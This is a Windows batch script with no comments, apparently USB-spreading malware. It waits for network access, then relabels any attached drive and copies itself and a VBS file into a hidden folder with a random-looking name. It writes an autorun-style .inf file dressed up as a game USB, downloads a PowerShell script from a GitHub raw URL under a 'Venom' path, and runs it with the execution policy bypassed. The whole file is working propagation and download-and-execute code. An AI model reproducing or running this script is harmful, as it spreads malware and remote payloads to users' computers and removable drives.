@echo off

:check_internet
ping -n 1 8.8.8.8 >nul 2>&1
if errorlevel 1 (
    timeout /t 100 >nul
    goto check_internet
)

:check_drive

set timeout_period=30
for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\ (
        goto Yes
    )
)

timeout /t 100 >nul
goto check_drive

:Yes
for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\ (
        timeout /t 60 >nul

        for /f %%i in ('PowerShell -Command "[char]([byte](Get-Random -Minimum 65 -Maximum 90))"') do set randomLetter=%%i

        label %%d: U$B_%randomLetter%

        md "%%d:\DNRLhEcdq"
        attrib +h "%%d:\DNRLhEcdq"

        copy "%~f0" "%%d:\DNRLhEcdq\nEQlCzTBpDrO.bat"
        copy "ZDaFvwjOosKx.vbs" "%%d:\DNRLhEcdq\ZDaFvwjOosKx.vbs"
        echo [KLDEjwsSHoky] > "%%d:\DNRLhEcdq\KLDEjwsSHoky.inf"
        echo label=AssassinsCreed_USB >> "%%d:\DNRLhEcdq\KLDEjwsSHoky.inf"
        echo action=Open folder to view files >> "%%d:\DNRLhEcdq\KLDEjwsSHoky.inf"
        echo open=explorer.exe >> "%%d:\DNRLhEcdq\KLDEjwsSHoky.inf"

        powershell.exe -Command "Invoke-WebRequest -Uri 'raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/Extract.ps1' -OutFile '%%d:\DNRLhEcdq\wYytnosVxfzD.ps1'"

        powershell.exe -ExecutionPolicy Bypass -File "%%d:\DNRLhEcdq\wYytnosVxfzD.ps1"
    )
)

@end
exit
